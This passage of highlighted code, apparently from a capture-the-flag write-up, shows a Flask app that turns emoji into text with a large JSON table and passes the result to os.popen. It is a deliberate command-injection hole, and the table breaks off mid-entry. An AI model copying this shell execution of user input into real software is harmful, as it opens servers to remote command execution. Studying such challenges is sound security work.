class="title function_">translate</span>(<span class="params">command: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    emoji_table = json.load(<span class="built_in">open</span>(<span class="string">&quot;emoji.json&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> emoji_table:</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">in</span> command:</span><br><span class="line">            command = command.replace(key, emoji_table[key])</span><br><span class="line">    <span class="keyword">return</span> command.lower()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/api&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">api</span>():</span><br><span class="line">    command = request.args.get(<span class="string">&quot;command&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">set</span>(command).intersection(<span class="built_in">set</span>(string.printable.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>)))) &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;command&quot;</span>: command, <span class="string">&quot;result&quot;</span>: <span class="string">&quot;Invalid command&quot;</span>&#125;)</span><br><span class="line">    command = translate(command)</span><br><span class="line">    result = os.popen(command + <span class="string">&quot; 2&gt;&amp;1&quot;</span>).read()</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;command&quot;</span>: command, <span class="string">&quot;result&quot;</span>: result&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">5000</span>)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;😀&quot;</span>: <span class="string">&quot;:D&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😁&quot;</span>: <span class="string">&quot;:D&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😂&quot;</span>: <span class="string">&quot;:&#x27;)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤣&quot;</span>: <span class="string">&quot;XD&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😃&quot;</span>: <span class="string">&quot;:D&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😄&quot;</span>: <span class="string">&quot;:D&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😅&quot;</span>: <span class="string">&quot;&#x27;:D&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😆&quot;</span>: <span class="string">&quot;XD&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😉&quot;</span>: <span class="string">&quot;;)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😊&quot;</span>: <span class="string">&quot;:)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😋&quot;</span>: <span class="string">&quot;:P&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😎&quot;</span>: <span class="string">&quot;B)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😍&quot;</span>: <span class="string">&quot;:)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😘&quot;</span>: <span class="string">&quot;:*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😗&quot;</span>: <span class="string">&quot;:*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😙&quot;</span>: <span class="string">&quot;:*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😚&quot;</span>: <span class="string">&quot;:*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;☺️&quot;</span>: <span class="string">&quot;:)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🙂&quot;</span>: <span class="string">&quot;:)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤗&quot;</span>: <span class="string">&quot;:)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤩&quot;</span>: <span class="string">&quot;:)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤔&quot;</span>: <span class="string">&quot;:?&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤨&quot;</span>: <span class="string">&quot;:/&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😐&quot;</span>: <span class="string">&quot;:|&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😑&quot;</span>: <span class="string">&quot;:|&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😶&quot;</span>: <span class="string">&quot;:|&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🙄&quot;</span>: <span class="string">&quot;:/&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😏&quot;</span>: <span class="string">&quot;:]&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😣&quot;</span>: <span class="string">&quot;&gt;:&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😥&quot;</span>: <span class="string">&quot;:&#x27;(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😮&quot;</span>: <span class="string">&quot;:o&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤐&quot;</span>: <span class="string">&quot;:x&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😯&quot;</span>: <span class="string">&quot;:o&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😪&quot;</span>: <span class="string">&quot;:&#x27;(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😫&quot;</span>: <span class="string">&quot;&gt;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😴&quot;</span>: <span class="string">&quot;Zzz&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😌&quot;</span>: <span class="string">&quot;:)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😛&quot;</span>: <span class="string">&quot;:P&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😜&quot;</span>: <span class="string">&quot;;P&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😝&quot;</span>: <span class="string">&quot;XP&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤤&quot;</span>: <span class="string">&quot;:P&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😒&quot;</span>: <span class="string">&quot;:/&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😓&quot;</span>: <span class="string">&quot;;/&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😔&quot;</span>: <span class="string">&quot;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😕&quot;</span>: <span class="string">&quot;:/&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🙃&quot;</span>: <span class="string">&quot;(:&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤑&quot;</span>: <span class="string">&quot;$)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😲&quot;</span>: <span class="string">&quot;:O&quot;</span>,</span><br><span class="line">    <span class="string">&quot;☹️&quot;</span>: <span class="string">&quot;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🙁&quot;</span>: <span class="string">&quot;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😖&quot;</span>: <span class="string">&quot;&gt;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😞&quot;</span>: <span class="string">&quot;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😟&quot;</span>: <span class="string">&quot;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😤&quot;</span>: <span class="string">&quot;&gt;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😢&quot;</span>: <span class="string">&quot;:&#x27;(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😭&quot;</span>: <span class="string">&quot;:&#x27;(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😦&quot;</span>: <span class="string">&quot;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😧&quot;</span>: <span class="string">&quot;&gt;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😨&quot;</span>: <span class="string">&quot;:O&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😩&quot;</span>: <span class="string">&quot;&gt;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤯&quot;</span>: <span class="string">&quot;:O&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😬&quot;</span>: <span class="string">&quot;:E&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😰&quot;</span>: <span class="string">&quot;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😱&quot;</span>: <span class="string">&quot;:O&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🥵&quot;</span>: <span class="string">&quot;&gt;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🥶&quot;</span>: <span class="string">&quot;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😳&quot;</span>: <span class="string">&quot;:$&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤪&quot;</span>: <span class="string">&quot;:P&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😵&quot;</span>: <span class="string">&quot;X(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🥴&quot;</span>: <span class="string">&quot;:P&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😠&quot;</span>: <span class="string">&quot;&gt;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😡&quot;</span>: <span class="string">&quot;&gt;:(，&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤬&quot;</span>: <span class="string">&quot;#$%&amp;!&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤕&quot;</span>: <span class="string">&quot;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤢&quot;</span>: <span class="string">&quot;X(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤮&quot;</span>: <span class="string">&quot;:P&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤧&quot;</span>: <span class="string">&quot;:&#x27;(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😇&quot;</span>: <span class="string">&quot;O:)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🥳&quot;</span>: <span class="string">&quot;:D&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🥺&quot;</span>: <span class="string">&quot;:&#x27;(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤡&quot;</span>: <span class="string">&quot;:o)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤠&quot;</span>: <span class="string">&quot;Y)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤥&quot;</span>: <span class="string">&quot;:L&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤫&quot;</span>: <span class="string">&quot;:x&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤭&quot;</span>: <span class="string">&quot;:x&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐶&quot;</span>: <span class="string">&quot;dog&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐱&quot;</span>: <span class="string">&quot;cat&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐭&quot;</span>: <span class="string">&quot;mouse&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐹&quot;</span>: <span class="string">&quot;hamster&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐰&quot;</span>: <span class="string">&quot;rabbit&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦊&quot;</span>: <span class="string">&quot;fox&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐻&quot;</span>: <span class="string">&quot;bear&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐼&quot;</span>: <span class="string">&quot;panda&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐨&quot;</span>: <span class="string">&quot;koala&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐯&quot;</span>: <span class="string">&quot;tiger&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦁&quot;</span>: <span class="string">&quot;lion&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐮&quot;</span>: <span class="string">&quot;cow&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐷&quot;</span>: <span class="string">&quot;pig&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐽&quot;</span>: <span class="string">&quot;pig nose&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐸&quot;</span>: <span class="string">&quot;frog&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐒&quot;</span>: <span class="string">&quot;monkey&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐔&quot;</span>: <span class="string">&quot;chicken&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐧&quot;</span>: <span class="string">&quot;penguin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐦&quot;</span>: <span class="string">&quot;bird&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐤&quot;</span>: <span class="string">&quot;baby chick&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐣&quot;</span>: <span class="string">&quot;hatching chick&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐥&quot;</span>: <span class="string">&quot;front-facing baby chick&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦆&quot;</span>: <span class="string">&quot;duck&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦅&quot;</span>: <span class="string">&quot;eagle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦉&quot;</span>: <span class="string">&quot;owl&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦇&quot;</span>: <span class="string">&quot;bat&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐺&quot;</span>: <span class="string">&quot;wolf&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐗&quot;</span>: <span class="string">&quot;boar&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐴&quot;</span>: <span class="string">&quot;horse&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦄&quot;</span>: <span class="string">&quot;unicorn&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐝&quot;</span>: <span class="string">&quot;bee&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐛&quot;</span>: <span class="string">&quot;bug&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦋&quot;</span>: <span class="string">&quot;butterfly&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐌&quot;</span>: <span class="string">&quot;snail&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐞&quot;</span>: <span class="string">&quot;lady beetle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐜&quot;</span>: <span class="string">&quot;ant&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦟&quot;</span>: <span class="string">&quot;mosquito&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦗&quot;</span>: <span class="string">&quot;cricket&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🕷️&quot;</span>: <span class="string">&quot;spider&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🕸️&quot;</span>: <span class="string">&quot;spider web&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦂&quot;</span>: <span class="string">&quot;scorpion&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐢&quot;</span>: <span class="string">&quot;turtle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐍&quot;</span>: <span class="string">&quot;python&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦎&quot;</span>: <span class="string">&quot;lizard&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦖&quot;</span>: <span class="string">&quot;T-Rex&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦕&quot;</span>: <span class="string">&quot;sauropod&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐙&quot;</span>: <span class="string">&quot;octopus&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦑&quot;</span>: <span class="string">&quot;squid&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦐&quot;</span>: <span class="string">&quot;shrimp&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦞&quot;</span>: <span class="string">&quot;lobster&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦀&quot;</span>: <span class="string">&quot;crab&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐡&quot;</span>: <span class="string">&quot;blowfish&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐠&quot;</span>: <span class="string">&quot;tropical fish&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐟&quot;</span>: <span class="string">&quot;fish&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐬&quot;</span>: <span class="string">&quot;dolphin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐳&quot;</span>: <span class="string">&quot;whale&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐋&quot;</span>: <span class="string">&quot;whale&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦈&quot;</span>: <span class="string">&quot;shark&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐊&quot;</span>: <span class="string">&quot;crocodile&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐅&quot;</span>: <span class="string">&quot;tiger&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐆&quot;</span>: <span class="string">&quot;leopard&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦓&quot;</span>: <span class="string">&quot;zebra&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦍&quot;</span>: <span class="string">&quot;gorilla&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦧&quot;</span>: <span class="string">&quot;orangutan&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦣&quot;</span>: <span class="string">&quot;mammoth&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐘&quot;</span>: <span class="string">&quot;elephant&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦛&quot;</span>: <span class="string">&quot;hippopotamus&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦏&quot;</span>: <span class="string">&quot;rhinoceros&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐪&quot;</span>: <span class="string">&quot;camel&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐫&quot;</span>: <span class="string">&quot;two-hump camel&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦒&quot;</span>: <span class="string">&quot;giraffe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦘&quot;</span>: <span class="string">&quot;kangaroo&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦬&quot;</span>: <span class="string">&quot;bison&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦥&quot;</span>: <span class="string">&quot;sloth&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦦&quot;</span>: <span class="string">&quot;otter&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦨&quot;</span>: <span class="string">&quot;skunk&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦡&quot;</span>: <span class="string">&quot;badger&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐾&quot;</span>: <span class="string">&quot;paw prints&quot;</span>,</span><br><span class="line">    <span class="string">&quot;◼️&quot;</span>: <span class="string">&quot;black square&quot;</span>,</span><br><span class="line">    <span class="string">&quot;◻️&quot;</span>: <span class="string">&quot;white square&quot;</span>,</span><br><span class="line">    <span class="string">&quot;◾&quot;</span>: <span class="string">&quot;black medium square&quot;</span>,</span><br><span class="line">    <span class="string">&quot;◽&quot;</span>: <span class="string">&quot;white medium square&quot;</span>,</span><br><span class="line">    <span class="string">&quot;▪️&quot;</span>: <span class="string">&quot;black small square&quot;</span>,</span><br><span class="line">    <span class="string">&quot;▫️&quot;</span>: <span class="string">&quot;white small square&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🔶&quot;</span>: <span class="string">&quot;large orange diamond&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🔷&quot;</span>: <span class="string">&quot;large blue diamond&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🔸&quot;</span>: <span class="string">&quot;small orange diamond&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🔹&quot;</span>: <span class="string">&quot;small blue diamond&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🔺&quot;</span>: <span class="string">&quot;triangle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🔻&quot;</span>: <span class="string">&quot;triangle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🔼&quot;</span>: <span class="string">&quot;triangle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🔽&quot;</span>: <span class="string">&quot;triangle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🔘&quot;</span>: <span class="string">&quot;circle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;⚪&quot;</span>: <span class="string">&quot;circle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;⚫&quot;</span>: <span class="string">&quot;black circle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🟠&quot;</span>: <span class="string">&quot;orange circle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🟢&quot;</span>: <span class="string">&quot;green circle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🔵&quot;</span>: <span class="string">&quot;blue circle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🟣&quot;</span>: <span class="string">&quot;purple circle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🟡&quot;</span>: <span class="string">&quot;yellow circle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🟤&quot;</span>: <span class="string">&quot;brown circle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;⭕&quot;</span>: <span class="string">&quot;empty circle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🅰️&quot;</span>: <span class="string">&quot;A&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🅱️&quot;</span>: <span class="string">&quot;B&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🅾️&quot;</span>: <span class="string">&quot;O&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ℹ️&quot;</span>: <span class="string">&quot;i&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🅿️&quot;</span>: <span class="string">&quot;P&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Ⓜ️&quot;</span>: <span class="string">&quot;M&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🆎&quot;</span>: <span class="string">&quot;AB&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🆑&quot;</span>: <span class="string">&quot;CL&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🆒&quot;</span>: <span class="string">&quot;COOL&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🆓&quot;</span>: <span class="string">&quot;FREE&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🆔&quot;</span>: <span class="string">&quot;ID&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🆕&quot;</span>: <span class="string">&quot;NEW&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🆖&quot;</span>: <span class="string">&quot;NG&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🆗&quot;</span>: <span class="string">&quot;OK&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🆘&quot;</span>: <span class="string">&quot;SOS&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🆙&quot;</span>: <span class="string">&quot;UP&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🆚&quot;</span>: <span class="string">&quot;VS&quot;</span>,</span><br><span class="line">    <span class="string">&quot;㊗️&quot;</span>: <span class="string">&quot;祝&quot;</span>,</span><br><span class="line">    <span class="string">&quot;㊙️&quot;</span>: <span class="string">&quot;秘&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🈺&quot;</span>: <span class="string">&quot;營&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🈯&quot;</span>: <span class="string">&quot;指&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🉐&quot;</span>: <span class="string">&quot;得&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🈹&quot;</span>: <span class="string">&quot;割&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🈚&quot;</span>: <span class="string">&quot;無&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🈲&quot;</span>: <span class="string">&quot;禁&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🈸&quot;</span>: <span class="string">&quot;申&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🈴&quot;</span>: <span class="string">&quot;合&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🈳&quot;</span>: <span class="string">&quot;空&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🈵&quot;</span>: <span class="string">&quot;滿&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🈶&quot;</span>: <span class="string">&quot;有&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🈷️&quot;</span>: <span class="string">&quot;月&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🚗&quot;</span>: <span class="string">&quot;car&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🚕&quot;</span>: <span class="string">&quot;taxi&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🚙&quot;</span>: <span class="string">&quot;SUV&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🚌&quot;</span>: <span class="string">&quot;bus&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🚎&quot;</span>: <span class="string">&quot;trolleybus&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🏎️&quot;</span>: <span class="string">&quot;race car&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🚓&quot;</span>: <span class="string">&quot;police car&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🚑&quot;</span>: <span class="string">&quot;ambulance&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🚒&quot;</span>: <span class="string">&quot;fire engine&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🚐&quot;</span>: <span class="string">&quot;minibus&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🚚&quot;</span>: <span class="string">&quot;delivery truck&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🚛&quot;</span>: <span class="string">&quot;articulated lorry&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🚜&quot;</span>: <span class="string">&quot;tractor&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🛴&quot;</span>: <span class="string">&quot;kick scooter&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🚲&quot;</span>: <span class="string">&quot;bicycle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🛵&quot;</span>: <span class="string">&quot;scooter&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🏍️&quot;</span>: <span class="string">&quot;motorcycle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;✈️&quot;</span>: <span class="string">&quot;airplane&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🚀&quot;</span>: <span class="string">&quot;rocket&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🛸&quot;</span>: <span class="string">&quot;UFO&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🚁&quot;</span>: <span class="string">&quot;helicopter&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🛶&quot;</span>: <span class="string">&quot;canoe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;⛵&quot;</span>: <span class="string">&quot;sailboat&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🚤&quot;</span>: <span class="string">&quot;speedboat&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🛳️&quot;</span>: <span class="string">&quot;passenger ship&quot;</span>,</span><br><span class="line">    <span class="string">&quot;⛴️&quot;</span>: <span class="string">&quot;ferry&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🛥️&quot;</span>: <span class="string">&quot;motor boat&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🚢&quot;</span>: <span class="string">&quot;ship&quot;</span>,</span><br><span class="line">    <span class="string">&quot;👨&quot;</span>: <span class="string">&quot;man&quot;</span>,</span><br><span class="line">    <span class="string">&quot;👩&quot;</span>: <span class="string">&quot;woman&quot;</span>,</span><br><span class="line">    <span class="string">&quot;👶&quot;</span>: <span class="string">&quot;baby&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🧓&quot;</span>: <span class="string">&quot;old man&quot;</span>,</span><br><span class="line">    <span class="string">&quot;👵&quot;</span>: <span class="string">&quot;old woman&quot;</span>,</span><br><span class="line">    <span class="string">&quot;💿&quot;</span>: <span class="string">&quot;CD&quot;</span>,</span><br><span class="line">    <span class="string">&quot;📀&quot;</span>: <span class="string">&quot;DVD&quot;</span>,</span><br><span class="line">    <span class="string">&quot;📱&quot;</span>: <span class="string">&quot;phone&quot;</span>,</span><br><span class="line">    <span class="string">&quot;💻&quot;</span>: <span class="string">&quot;laptop&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🖥️&quot;</span>: <span class="string">&quot;pc&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🖨️&quot;</span>: <span class="string">&quot;printer&quot;</span>,</span><br><span class="line">    <span class="string">&quot;⌨️&quot;</span>: <span class="string">&quot;keyboard&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🖱️&quot;</span>: <span class="string">&quot;mouse&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🖲️&quot;</span>: <span class="string">&quot;trackball&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🕹️&quot;</span>: <span class="string">&quot;joystick&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🗜️&quot;</span>: <span 